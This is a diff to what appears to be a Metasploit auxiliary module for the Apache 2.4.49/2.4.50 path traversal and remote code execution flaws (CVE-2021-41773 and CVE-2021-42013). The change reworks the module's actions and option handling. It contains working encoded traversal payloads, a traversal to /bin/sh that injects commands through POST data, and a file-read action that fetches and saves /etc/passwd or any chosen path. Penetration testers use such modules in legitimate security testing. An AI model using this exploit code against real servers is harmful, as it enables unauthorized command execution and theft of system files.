@@ -46,36 +46,34 @@ class MetasploitModule < Msf::Auxiliary
         },
         'Actions' => [
           [
-            'Apache 2.4.49',
+            'CHECK_TRAVERSAL',
             {
-              'Description' => 'Payload for Apache 2.4.49',
-              'CVE' => 'CVE-2021-41773',
-              'Payload' => '.%2e/'
+              'Description' => 'Check for vulnerability.'
             }
           ],
           [
-            'Apache 2.4.49 and 2.4.50',
+            'CHECK_RCE',
             {
-              'Description' => 'Payload for Apache 2.4.49 and 2.4.50',
-              'CVE' => 'CVE-2021-42013',
-              'Payload' => '.%%32%65/'
+              'Description' => 'Check for RCE (if mod_cgi is enabled).'
+            }
+          ],
+          [
+            'READ_FILE',
+            {
+              'Description' => 'Read file on the remote server.'
             }
           ]
         ],
-        'DefaultAction' => 'Apache 2.4.49 and 2.4.50'
+        'DefaultAction' => 'CHECK_TRAVERSAL'
       )
     )
 
     register_options([
-      OptEnum.new('StartMode', [true, 'Start mode.', 'Traversal', [ 'Traversal', 'RCE', 'Read']]),
+      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),
+      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),
       OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),
-      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
-      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
+      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])
     ])
-  end
-
-  def message(msg)
-    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
   def exec_traversal(cmd)
@@ -84,6 +82,23 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),
       'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"
     })
+  end
+
+  def message(msg)
+    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
+  end
+
+  def pick_payload
+    case datastore['CVE']
+    when 'CVE-2021-41773'
+      payload = '.%2e/'
+    when 'CVE-2021-42013'
+      payload = '.%%32%65/'
+    else
+      payload = ''
+    end
+
+    payload
   end
 
   def read_traversal
@@ -96,10 +111,10 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     @proto = (ssl ? 'https' : 'http')
 
-    case datastore['StartMode']
-    when /Traversal/
+    case action.name
+    when 'CHECK_TRAVERSAL'
       @target_uri = Rex::Text.rand_text_alpha(4..8)
-      @traversal = action['Payload'] * datastore['DEPTH'] << '/etc/passwd'
+      @traversal = pick_payload * datastore['DEPTH'] << '/etc/passwd'
 
       response = read_traversal
       unless response
@@ -109,11 +124,11 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if response.code != 403
-        print_error(message("The target is not vulnerable to #{action['CVE']}."))
+        print_error(message("The target is not vulnerable to #{datastore['CVE']}."))
 
         return Exploit::CheckCode::Safe
       end
-      print_good(message("The target is vulnerable to #{action['CVE']}."))
+      print_good(message("The target is vulnerable to #{datastore['CVE']}."))
 
       vprint_status("Obtained HTTP response code #{response.code}.")
       report_vuln(
@@ -123,8 +138,8 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       return Exploit::CheckCode::Vulnerable
-    when /RCE/
-      @traversal = action['Payload'] * datastore['DEPTH'] << '/bin/sh'
+    when 'CHECK_RCE'
+      @traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'
       rand_str = Rex::Text.rand_text_alpha(4..8)
 
       response = exec_traversal("echo #{rand_str}")
@@ -135,7 +150,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if response.code == 200 && response.body.include?(rand_str)
-        print_good(message("The target is vulnerable to #{action['CVE']} (mod_cgi enabled)."))
+        print_good(message("The target is vulnerable to #{datastore['CVE']} (mod_cgi enabled)."))
         report_vuln(
           host: target_host,
           name: name,
@@ -144,30 +159,36 @@ class MetasploitModule < Msf::Auxiliary
 
         return Exploit::CheckCode::Vulnerable
       end
-      print_error(message("The target is not vulnerable to #{action['CVE']} (mod_cgi enabled)."))
+      print_error(message("The target is not vulnerable to #{datastore['CVE']} (mod_cgi enabled)."))
 
       return Exploit::CheckCode::Safe
-    when /Read/
+    when 'READ_FILE'
       fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?
 
       @target_uri = datastore['TARGETURI']
-      @traversal = action['Payload'] * datastore['DEPTH'] << datastore['FILEPATH']
+      @traversal = pick_payload * datastore['DEPTH'] << datastore['FILEPATH']
 
       response = read_traversal
       unless response
         print_error(message('No response, target seems down.'))
 
-        return
+        return Exploit::CheckCode::Unknown
       end
 
+      vprint_status("Obtained HTTP response code #{response.code}.")
       if response.code == 500
-        print_warning(message("The target is vulnerable to #{action['CVE']} (mod_cgi enabled)."))
+        print_warning(message("The target is vulnerable to #{datastore['CVE']} (mod_cgi enabled)."))
+        report_vuln(
+          host: target_host,
+          name: name,
+          refs: references
+        )
       end
 
       if response.code == 500 || response.body.empty?
         print_error('Nothing was downloaded')
 
-        return
+        return Exploit::CheckCode::Vulnerable if response.code == 500
       end
 
       if response.code == 200
@@ -180,7 +201,17 @@ class MetasploitModule < Msf::Auxiliary
           datastore['FILEPATH']
         )
         print_good("File saved in: #{path}")
+
+        report_vuln(
+          host: target_host,
+          name: name,
+          refs: references
+        )
+
+        return Exploit::CheckCode::Vulnerable
       end
+
+      return Exploit::CheckCode::Safe
     end
   end
 end
